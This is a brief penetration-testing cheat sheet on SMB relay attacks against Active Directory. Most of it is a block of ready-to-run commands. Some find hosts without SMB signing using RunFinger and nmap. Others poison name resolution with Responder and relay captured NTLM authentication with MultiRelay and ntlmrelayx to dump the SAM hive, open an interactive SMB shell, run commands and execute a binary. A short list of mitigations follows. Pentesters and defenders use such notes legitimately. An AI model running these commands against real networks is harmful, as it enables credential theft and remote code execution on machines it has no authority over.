---
title: "SMB Relay"
description: "SMB Relay attacks using Responder."
lead: "Using responder.py, ntlmrelayx.py, and runfinger.py to attack Active Directory."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "mitm_relay"
weight: 30
toc: true
---

## What is SMB Relay?

- Capture hashes
- Relay them to other hosts to authenticate
- No need to crack hashes with hashcat

## Requirements

- SMB signing must be disabled on the target
- SMB signing checks authenticity of SMB packets
- Relayed user credentials must be admin on target machine

## Exploitation

```bash
# Discover hosts with SMB signing disabled
python RunFinger.py -i 10.0.0.2/24
nmap --script=smb2-security-mode -p 445 -v 10.10.10.0/24

# Turn off HTTP and SMB in Responder.conf
nvim Responder.conf

# Start responder
python Responder.py -I tun0 -rdwv

# Set up relay

# Target specific host
python MultiRelay.py -t 10.0.2.4 -u ALL

# Target multiple hosts

# Dump SAM hive
python ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SMB shell
python ntlmrelayx.py -tf targets.txt -smb2support -i
nc 127.0.0.1 11000

# Execute command
python ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Execute binary
python ntlmrelayx.py -tf targets.txt -smb2support -e "shell.exe"
```

## Mitigation

- Enable SMB signing on all devices (may cause performance issues with file copies)
- Disable NTLM authentication on the network but Windows can default back to it if Kerberos stops working
- Account tiering: limit domain admins to specific tasks
- Local admin restriction (can increase service deskt tickets)
